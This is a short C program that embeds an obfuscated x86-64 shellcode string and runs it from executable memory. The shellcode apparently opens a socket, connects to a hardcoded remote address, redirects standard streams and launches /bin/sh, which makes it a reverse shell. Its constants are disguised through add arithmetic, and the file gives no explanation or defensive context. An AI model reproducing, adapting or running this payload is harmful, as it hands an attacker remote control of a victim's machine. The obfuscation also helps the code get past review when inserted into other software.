#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
char shellcode[] = "\xbf\xb0\x26\xd4\xd1\x48\x81\xc7\x52\xd9\x2b\x2e\x89\xff\xbe\xf8\xc4\x30\x60\x48\x81\xc6\x09\x3b\xcf\x9f\x89\xf6\x68\xff\xff\xff\xff\x5a\x48\xf7\xd2\xb8\xfb\xbe\x93\xc3\x48\x05\x2e\x41\x6c\x3c\x89\xc0\x0f\x05\x48\x89\xc7\xb8\x98\x97\x05\x14\x48\x05\x6a\x68\xfa\xeb\x89\xc0\x66\x89\x04\x24\xb8\x02\x0c\xed\x02\x48\x05\x1d\x84\x13\xfd\x89\xc0\x66\x89\x44\x24\x02\xb8\xd8\x83\xdd\x9e\x48\x05\xa7\x7c\x22\x62\x89\xc0\x89\x44\x24\x04\x68\xff\xff\xff\xff\x58\x48\xf7\xd0\x48\x89\x44\x24\x08\x48\x89\xe6\xba\x9c\xeb\x70\xbd\x48\x81\xc2\x74\x14\x8f\x42\x89\xd2\xb8\xd6\xe2\x28\xd3\x48\x05\x54\x1d\xd7\x2c\x89\xc0\x0f\x05\x68\xff\xff\xff\xff\x5e\x48\xf7\xd6\xb8\x7d\x8e\xf7\x4c\x48\x05\xa4\x71\x08\xb3\x89\xc0\x0f\x05\xbe\xa3\xf7\xf2\xf5\x48\x81\xc6\x5e\x08\x0d\x0a\x89\xf6\xb8\x92\x1a\xdc\xae\x48\x05\x8f\xe5\x23\x51\x89\xc0\x0f\x05\xbe\x5f\x23\x7f\xef\x48\x81\xc6\xa3\xdc\x80\x10\x89\xf6\xb8\x5d\x53\x21\x8e\x48\x05\xc4\xac\xde\x71\x89\xc0\x0f\x05\x48\x89\xe3\xc6\x03\x2f\x48\xff\xc3\xc6\x03\x62\x48\xff\xc3\xc6\x03\x69\x48\xff\xc3\xc6\x03\x6e\x48\xff\xc3\xc6\x03\x2f\x48\xff\xc3\xc6\x03\x73\x48\xff\xc3\xc6\x03\x68\x48\xff\xc3\xc6\x03\x01\x80\x2b\x01\x48\xff\xc3\x48\xc1\xef\x20\x48\xc1\xef\x20\x48\x31\xe7\x68\xff\xff\xff\xff\x5e\x48\xf7\xd6\x48\x31\xd2\xb8\xd3\x8a\x27\x5e\x48\x05\x68\x75\xd8\xa1\x89\xc0\x0f\x05";
void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}